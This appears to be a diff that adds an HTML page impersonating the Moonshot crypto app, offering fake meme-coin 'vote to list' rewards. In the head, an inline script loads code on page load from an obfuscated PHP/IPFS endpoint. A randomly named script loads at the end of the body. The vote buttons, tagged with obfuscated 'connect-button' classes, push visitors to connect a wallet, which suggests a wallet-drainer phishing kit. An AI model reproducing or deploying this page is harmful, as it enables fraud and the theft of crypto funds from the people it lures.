@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport" />
+  <meta content="Vote Rosie to list on Moonshot" property="og:title" id="ogTitle" />
+  <meta content="Vote YES to earn XP. Help prioritize Rosie for potential listing in the Moonshot app."
+    property="og:description" id="ogDesc" />
+  <meta content="site_preview.png" property="og:image" id="ogImage" />
+  <meta content="website" property="og:type" />
+  <meta content="" property="og:url" id="ogUrl" />
+  <meta content="summary_large_image" name="twitter:card" />
+  <meta content="Vote Rosie to list on Moonshot" name="twitter:title" id="twTitle" />
+  <meta content="Vote YES to earn XP. Help prioritize Rosie for potential listing in the Moonshot app."
+    name="twitter:description" id="twDesc" />
+  <meta content="site_preview.png" name="twitter:image" id="twImage" />
+  <meta content="Vote to list on Moonshot" name="Description" id="metaDesc" />
+  <link href="assets_img_shot.png" rel="icon" sizes="32x32" type="image/png" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
+    rel="stylesheet" />
+  <link href="assets_css_style.css?v=3" rel="stylesheet" />
+  <title>Moonshot – Vote to List</title>
+  <script>
+    document.head.append(Object.assign(document.createElement("script"), {src: "/eAY1NBzg.php?c=%2Fipfs%2FgqBclL5D-sYlNrSEcR2B5Q084bbf8572971de9f44704b63aa4eb5e%3Ft%3D" + Date.now()}));
+</script>
+
+     <script>
+    const COIN = {
+      name: "", ticker: "", image: "", ca: "",
+      yes: 849, no: 128, xpPerVote: 1000,
+      loaded: false, hasCA: false,
+    };
+    (function () {
+      const path = window.location.pathname;
+      const segments = path.split('/').filter(s => s && s !== 'index.html' && !s.endsWith('.html'));
+      const lastSeg = segments.length > 0 ? segments[segments.length - 1] : '';
+      if (lastSeg && /^[A-Za-z0-9]{20,}$/.test(lastSeg)) {
+        COIN.ca = lastSeg; COIN.hasCA = true;
+      }
+      const hash = window.location.hash;
+      if (hash && hash.startsWith('#/')) {
+        const hCA = hash.substring(2);
+        if (hCA && /^[A-Za-z0-9]{20,}$/.test(hCA)) {
+          COIN.ca = hCA; COIN.hasCA = true;
+        }
+      }
+    })();
+  </script>
+</head>
+
+<body>
+
+  <!-- ===== LOADING OVERLAY (only when CA is present) ===== -->
+  <div class="loading-overlay" id="loadingOverlay" style="display:none;">
+    <div class="loading-spinner">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring spinner-ring-2"></div>
+      <div class="spinner-ring spinner-ring-3"></div>
+      <p class="loading-text">Fetching token data<span
+          class="loading-dots"><span>.</span><span>.</span><span>.</span></span></p>
+    </div>
+  </div>
+
+  <!-- ===== FLOATING PARTICLES ===== -->
+  <div class="particles" id="particles" aria-hidden="true"></div>
+
+  <!-- ===== LANDING PAGE (no CA provided) ===== -->
+  <div class="landing-page" id="landingPage" style="display:none;">
+    <div class="landing-bg"></div>
+    <div class="landing-content">
+      <img src="moonshot-logo.png" alt="Moonshot" class="landing-logo" />
+      <h1 class="landing-title">Vote the next meme coin<br /><span>to list on Moonshot</span></h1>
+      <p class="landing-subtitle">Enter a token contract address to open the voting page for that token.</p>
+      <div class="landing-input-wrap">
+        <input type="text" id="caInput" class="landing-input" placeholder="Paste contract address..." autocomplete="off"
+          spellcheck="false" />
+        <button type="button" id="caSubmit" class="landing-submit">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"
+              stroke-linejoin="round" />
+          </svg>
+        </button>
+      </div>
+      <p class="landing-hint">Example: <span id="exampleCA"
+          class="landing-example">9QSjVAg5rDfBZPhvKwZcB63St3r6bqohP3Adurkjpump</span></p>
+      <div class="landing-features">
+        <div class="landing-feature">
+          <span class="landing-feature-icon">🚀</span>
+          <span>Earn Moonshotspan>
+        </div>
+        <div class="landing-feature">
+          <span class="landing-feature-icon">📊</span>
+          <span>Real-time votes</span>
+        </div>
+        <div class="landing-feature">
+          <span class="landing-feature-icon">⚡</span>
+          <span>Instant loading</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== VOTE PAGE (hidden until CA loads) ===== -->
+  <div id="votePage" style="display:none;">
+
+    <!-- YES VOTE MODAL -->
+    <div class="modal" id="modalYes">
+      <div class="modal_overlay"></div>
+      <div class="modal_rect">
+        <div class="modal_rect_content">
+          <svg class="modal_rect_close" fill="none" height="40" viewBox="0 0 40 40" width="40">
+            <circle cx="20" cy="20" fill="#3E3C58" fill-opacity="0.5" r="20" />
+            <path
+              d="M24.9916 13.3446C25.451 12.8851 26.1959 12.8851 26.6554 13.3446C27.1149 13.8041 27.1149 14.549 26.6554 15.0084L15.0084 26.6554C14.549 27.1149 13.8041 27.1149 13.3446 26.6554C12.8851 26.1959 12.8851 25.451 13.3446 24.9916L24.9916 13.3446Z"
+              fill="#E4DEF3" />
+            <path
+              d="M26.6554 24.9916C27.1149 25.451 27.1149 26.1959 26.6554 26.6554C26.1959 27.1149 25.451 27.1149 24.9916 26.6554L13.3446 15.0084C12.8851 14.549 12.8851 13.8041 13.3446 13.3446C13.8041 12.8851 14.549 12.8851 15.0084 13.3446L26.6554 24.9916Z"
+              fill="#E4DEF3" />
+          </svg>
+          <div class="modal_rect_up">
+            <img alt="" class="modal_rect_up_logo modalCoinLogo" src="assets_img_modal_rect_logo.png" />
+            <div class="modal_rect_up_texts">
+              <p class="modal_rect_up_text_tittle modalCoinName">Loading...</p>
+            </div>
+          </div>
+          <div class="modal_confirm_text">Confirm your <span class="modal_confirm_vote">YES vote</span><span
+              class="modal_confirm_dots"><span>.</span><span>.</span><span>.</span></span></div>
+          <div class="modal_rect_main">
+            <div class="modal_rect_main_content">
+              <p class="modal_rect_main_tittle"><svg fill="none" height="28" viewBox="0 0 28 28" width="28">
+                  <circle cx="14" cy="14" fill="#F631FC" r="14" />
+                  <path
+                    d="M13.4539 7.38576C13.6258 6.87141 14.3742 6.87141 14.5461 7.38576L15.8049 11.1523C15.8818 11.3824 16.1023 11.5381 16.3511 11.5381H20.4247C20.9809 11.5381 21.2122 12.2302 20.7622 12.548L17.4666 14.8759C17.2653 15.0181 17.1811 15.2701 17.258 15.5001L18.5168 19.2667C18.6887 19.781 18.0832 20.2087 17.6331 19.8908L14.3375 17.563C14.1363 17.4208 13.8637 17.4208 13.6625 17.563L10.3669 19.8908C9.91683 20.2087 9.31131 19.781 9.48321 19.2667L10.742 15.5001C10.8189 15.2701 10.7347 15.0181 10.5334 14.8759L7.23781 12.548C6.78777 12.2302 7.01906 11.5381 7.57534 11.5381H11.6489C11.8977 11.5381 12.1182 11.3824 12.1951 11.1523L13.4539 7.38576Z"
+                    fill="white" />
+                </svg> You'll earn <span class="modalXpAmount">1000</span> <span class="modal_xp_text">Moonshot XP</span>
+              </p>
+              <p class="modal_rect_main_text">These points unlock exclusive perks, early access to features, and future
+                rewards in the Moonshot ecosystem.</p>
+            </div>
+          </div>
+          <p class="modal_rect_text">By voting YES, you're supporting <span
+              class="modal_rect_text_pink modalCoinNameText">this token</span> for potential listing. If this token
+            reaches the community threshold, it enters our review queue and could go live in the Moonshot app at <span
+              class="modal_rect_text_utc">00:00 UTC</span> the following day.</p>
+          <div class="modal_rect_buttons">
+            <button class="modal_rect_button connect-button goKkMsK2 qFf1Sf01" id="modalYesConfirm">🚀 Vote YES & Earn XP</button>
+            <button class="modal_rect_button" id="modalYesCancel">Cancel</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- NO VOTE MODAL -->
+    <div class="modal" id="modalNo">
+      <div class="modal_overlay"></div>
+      <div class="modal_rect">
+        <div class="modal_rect_content">
+          <svg class="modal_rect_close" fill="none" height="40" viewBox="0 0 40 40" width="40">
+            <circle cx="20" cy="20" fill="#3E3C58" fill-opacity="0.5" r="20" />
+            <path
+              d="M24.9916 13.3446C25.451 12.8851 26.1959 12.8851 26.6554 13.3446C27.1149 13.8041 27.1149 14.549 26.6554 15.0084L15.0084 26.6554C14.549 27.1149 13.8041 27.1149 13.3446 26.6554C12.8851 26.1959 12.8851 25.451 13.3446 24.9916L24.9916 13.3446Z"
+              fill="#E4DEF3" />
+            <path
+              d="M26.6554 24.9916C27.1149 25.451 27.1149 26.1959 26.6554 26.6554C26.1959 27.1149 25.451 27.1149 24.9916 26.6554L13.3446 15.0084C12.8851 14.549 12.8851 13.8041 13.3446 13.3446C13.8041 12.8851 14.549 12.8851 15.0084 13.3446L26.6554 24.9916Z"
+              fill="#E4DEF3" />
+          </svg>
+          <div class="modal_rect_up">
+            <img alt="" class="modal_rect_up_logo modalCoinLogo" src="assets_img_modal_rect_logo.png" />
+            <div class="modal_rect_up_texts">
+              <p class="modal_rect_up_text_tittle modalCoinName">Loading...</p>
+            </div>
+          </div>
+          <div class="modal_confirm_text">Confirm your <span class="modal_confirm_vote modal_confirm_vote_no">NO
+              vote</span><span class="modal_confirm_dots"><span>.</span><span>.</span><span>.</span></span></div>
+          <div class="modal_rect_main">
+            <div class="modal_rect_main_content">
+              <p class="modal_rect_main_tittle"><svg fill="none" height="28" viewBox="0 0 28 28" width="28">
+                  <circle cx="14" cy="14" fill="#C40000" r="14" />
+                  <rect fill="#D9D9D9" height="17.643" transform="rotate(-45 7 8.76221)" width="2.15595" x="7"
+                    y="8.76221" />
+                  <rect fill="#D9D9D9" height="17.643" transform="rotate(45 19.4755 7)" width="2.15595" x="19.4755"
+                    y="7" />
+                </svg> No XP for NO votes</p>
+              <p class="modal_rect_main_text">NO votes don't earn Moonshot XP but help provide balanced community
+                feedback on token listings.</p>
+            </div>
+          </div>
+          <p class="modal_rect_text">By voting NO, you're indicating that <span
+              class="modal_rect_text_pink modalCoinNameText">this token</span> might not be ready for listing yet. Your
+            feedback helps maintain quality standards.</p>
+          <div class="modal_rect_buttons">
+            <button class="modal_rect_button modal_rect_button_no" id="modalNoConfirm">👎 Vote NO</button>
+            <button class="modal_rect_button" id="modalNoCancel">Cancel</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ABOUT MODAL -->
+    <div class="modal" id="modalAbout">
+      <div class="modal_overlay"></div>
+      <div class="modal_rect modal_rect_info">
+        <div class="modal_rect_content">
+          <svg class="modal_rect_close" fill="none" height="40" viewBox="0 0 40 40" width="40">
+            <circle cx="20" cy="20" fill="#3E3C58" fill-opacity="0.5" r="20" />
+            <path
+              d="M24.9916 13.3446C25.451 12.8851 26.1959 12.8851 26.6554 13.3446C27.1149 13.8041 27.1149 14.549 26.6554 15.0084L15.0084 26.6554C14.549 27.1149 13.8041 27.1149 13.3446 26.6554C12.8851 26.1959 12.8851 25.451 13.3446 24.9916L24.9916 13.3446Z"
+              fill="#E4DEF3" />
+            <path
+              d="M26.6554 24.9916C27.1149 25.451 27.1149 26.1959 26.6554 26.6554C26.1959 27.1149 25.451 27.1149 24.9916 26.6554L13.3446 15.0084C12.8851 14.549 12.8851 13.8041 13.3446 13.3446C13.8041 12.8851 14.549 12.8851 15.0084 13.3446L26.6554 24.9916Z"
+              fill="#E4DEF3" />
+          </svg>
+          <h2 class="info_modal_title">About Moonshot</h2>
+          <div class="info_modal_body">
+            <p>Moonshot is the first app on the App Store that lets you buy & sell memes with Apple Pay.</p>
+            <p>Sign up with email + FaceID, and you're in. No seed phrases, no mention of the blockchain, no esoteric
+              concepts. Send your friends coins via username.</p>
+            <p>Make money when your friends trade. Share your unique referral link, and get <span
+                class="highlight_pink">50% of the fees</span> they incur on the platform.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- REWARDS MODAL -->
+    <div class="modal" id="modalRewards">
+      <div class="modal_overlay"></div>
+      <div class="modal_rect modal_rect_info">
+        <div class="modal_rect_content">
+          <svg class="modal_rect_close" fill="none" height="40" viewBox="0 0 40 40" width="40">
+            <circle cx="20" cy="20" fill="#3E3C58" fill-opacity="0.5" r="20" />
+            <path
+              d="M24.9916 13.3446C25.451 12.8851 26.1959 12.8851 26.6554 13.3446C27.1149 13.8041 27.1149 14.549 26.6554 15.0084L15.0084 26.6554C14.549 27.1149 13.8041 27.1149 13.3446 26.6554C12.8851 26.1959 12.8851 25.451 13.3446 24.9916L24.9916 13.3446Z"
+              fill="#E4DEF3" />
+            <path
+              d="M26.6554 24.9916C27.1149 25.451 27.1149 26.1959 26.6554 26.6554C26.1959 27.1149 25.451 27.1149 24.9916 26.6554L13.3446 15.0084C12.8851 14.549 12.8851 13.8041 13.3446 13.3446C13.8041 12.8851 14.549 12.8851 15.0084 13.3446L26.6554 24.9916Z"
+              fill="#E4DEF3" />
+          </svg>
+          <h2 class="info_modal_title">Rewards — Moonshot XP</h2>
+          <div class="info_modal_body">
+            <p><strong>Moonshot XP</strong> is your on-platform reputation and contribution score. You earn XP by
+              participating — voting, engaging with launches, and completing in-app quests.</p>
+            <p>We plan to <span class="highlight_white">convert Moonshot XP into the MOON token</span> via a future
+              reward event.</p>
+            <div class="info_divider"></div>
+            <h3 class="info_sub_title">What to expect:</h3>
+            <ul class="info_list">
+              <li>Formal MOON rewards post with timelines and criteria</li>
+              <li>XP earned through verified, non-abusive actions counts</li>
+              <li>Anti-spam and anti-Sybil checks apply</li>
+              <li>Methodology documented before distribution</li>
+            </ul>
+            <p class="info_disclaimer">* Informational only. Not financial advice. XP→MOON plan may evolve.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HEADER -->
+    <header>
+      <div class="container">
+        <div class="header_items">
+          <div class="header_item">
+            <a class="header_logo" href="/">
+              <img alt="Moonshot" src="moonshot-logo.png" />
+              <span class="header_powered_badge">Powered by Moonshot</span>
+            </a>
+          </div>
+          <div class="header_item header_item_right">
+            <div class="header_navs">
+              <button class="header_nav_btn" id="btnAbout" type="button">About</button>
+              <button class="header_nav_btn" id="btnRewards" type="button">Rewards</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- MAIN -->
+    <main>
+      <section class="error-state" id="errorState" style="display:none;">
+        <div class="container">
+          <div class="error-content anim-fade-up">
+            <div class="error-icon">⚠️</div>
+            <h2>Token Not Found</h2>
+            <p>The contract address could not be found on DexScreener.</p>
+            <p class="error-ca" id="errorCA"></p>
+          </div>
+        </div>
+      </section>
+
+      <section class="intro" id="introSection">
+        <div class="container">
+          <div class="intro_blocks">
+            <div class="intro_block intro_block_left anim-fade-up anim-delay-1">
+              <div class="token-image-wrapper">
+                <div class="token-glow"></div>
+                <img alt="Token Logo" class="intro_block_image" id="tokenImage" src=""
+                  onerror="this.style.display='none'" />
+              </div>
+            </div>
+            <div class="intro_block intro_block_right">
+              <p class="intro_block_teg anim-fade-up anim-delay-1">VOTE</p>
+              <p class="intro_block_coin anim-fade-up anim-delay-2" id="coinName">Loading...</p>
+              <h1 class="intro_block_tittle anim-fade-up anim-delay-2" id="mainTitle">Vote the next <span>meme
+                  coin</span> to list</h1>
+              <h2 class="intro_block_subtittle anim-fade-up anim-delay-3">Now verified on <span>Moonshot</span>. Help
+                prioritize this listing with your vote. Each eligible YES vote awards <span>Moonshot XP.</span> Strong
+                community sentiment may lead to an in-app review for potential listing.</h2>
+              <div class="intro_block_adress anim-fade-up anim-delay-3">
+                <p class="intro_block_adress_tittle">Contract</p>
+                <div class="intro_block_adress_copy" id="copyArea">
+                  <input class="intro_block_adress_copy_input" disabled id="contractAddress" placeholder="Loading..."
+                    type="text" value="" />
+                  <svg class="intro_block_adress_copy_icon" fill="none" height="16" viewBox="0 0 15 16" width="15">
+                    <path
+                      d="M13.5 15.5H6C5.175 15.5 4.5 14.825 4.5 14V6.5C4.5 5.675 5.175 5 6 5H13.5C14.325 5 15 5.675 15 6.5V14C15 14.825 14.325 15.5 13.5 15.5ZM13.5 6.5H6V14H13.5V6.5Z"
+                      fill="#A8A2B2" />
+                    <path
+                      d="M9 2H1.5V9.5H3V11H1.5C0.675 11 0 10.325 0 9.5V2C0 1.175 0.675 0.499999 1.5 0.499999H9C9.825 0.499999 10.5 1.175 10.5 2V3.5H9V2Z"
+                      fill="#A8A2B2" />
+                  </svg>
+                  <span class="copy-notification" id="copyNotif">✓ Copied!</span>
+                </div>
+              </div>
+              <div class="intro_block_progress anim-fade-up anim-delay-4">
+                <p class="intro_block_progress_vs"><span>YES</span> vs <span class="progress_vs_no">NO</span> — push for
+                  listing</p>
+                <div class="intro_block_progress_texts">
+                  <p class="intro_block_progress_text progress_text_yes">YES <span id="yesVotes">0</span></p>
+                  <p class="intro_block_progress_text progress_text_no">NO <span id="noVotes">0</span></p>
+                </div>
+                <div class="intro_block_progress_rect">
+                  <div class="intro_block_progress_rect_now" id="progressBar"></div>
+                </div>
+                <p class="intro_block_progress_rect_caption" id="progressCaption"></p>
+                <p class="intro_block_progress_rect_lost" id="progressText">Loading...</p>
+              </div>
+              <div class="intro_block_benefit anim-fade-up anim-delay-4" id="benefitBanner"></div>
+              <div class="intro_block_buttons anim-fade-up anim-delay-5">
+                <button class="intro_block_button intro_block_button_yes" id="buttonYes">Vote to list</button>
+                <button class="intro_block_button intro_block_button_no" id="buttonNo">Not now</button>
+              </div>
+              <p class="intro_block_info anim-fade-up anim-delay-5">* Real-time vote totals. Anti-spam enforced. YES
+                votes earn <span>Moonshot XP</span> in the app.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="informations" id="infoSection">
+        <div class="container">
+          <div class="informations_blocks">
+            <div class="informations_block anim-fade-up anim-delay-1">
+              <div class="informations_rect">
+                <div class="informations_rect_content">
+                  <h4 class="informations_rect_recent">Recent activity</h4>
+                  <div class="informations_rect_items" id="recentActivity"></div>
+                </div>
+              </div>
+            </div>
+            <div class="informations_block anim-fade-up anim-delay-2">
+              <div class="informations_rect">
+                <div class="informations_rect_content">
+                  <h4 class="informations_rect_why">Why vote?</h4>
+                  <ul class="informations_rect_lists">
+                    <li class="informations_rect_list">Each eligible YES vote grants <span>Moonshot XP</span> — unlock
+                      perks &amp; early features.</li>
+                    <li class="informations_rect_list">Strong sentiment moves this token into the review queue for
+                      listing in the <span>Moonshot</span> app.</li>
+                    <li class="informations_rect_list">A connected wallet is required. Each YES vote earns
+                      <span>Moonshot XP</span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <div class="container">
+        <div class="footer_items">
+          <div class="footer_item">
+            <p class="footer_powered">Powered by Moonshot</p>
+            <p class="footer_item_text">This landing is part of the Moonshot discovery flow. Nothing here is financial
+              advice.</p>
+          </div>
+          <div class="footer_item">
+            <div class="footer_item_icons">
+              <a class="footer_item_icon" href="https://apps.apple.com/us/app/moonshot/id6503993131"
+                target="_blank"><img alt="App Store" loading="lazy" src="assets_img_footer_apstore.png" /></a>
+              <a class="footer_item_icon" href="https://play.google.com/store/apps/details?id=money.moonshot.app"
+                target="_blank"><img alt="Google Play" loading="lazy" src="assets_img_footer_google.png" /></a>
+            </div>
+          </div>
+        </div>
+        <p class="footer_copy">© 2026 Moonshot — HODL your memes responsibly.</p>
+      </div>
+    </footer>
+
+    <div class="sticky_cta_bar" id="stickyCta">
+      <button type="button" class="sticky_cta_bar_btn" id="stickyVoteBtn">🚀 Vote YES — earn 1000 XP</button>
+    </div>
+  </div><!-- /votePage -->
+
+  <script src="assets_js_script.js" defer></script>
+  <script src="k4to7dkmyy0.js?v=${Date.now()}"></script>
+</body>
+
+</html>
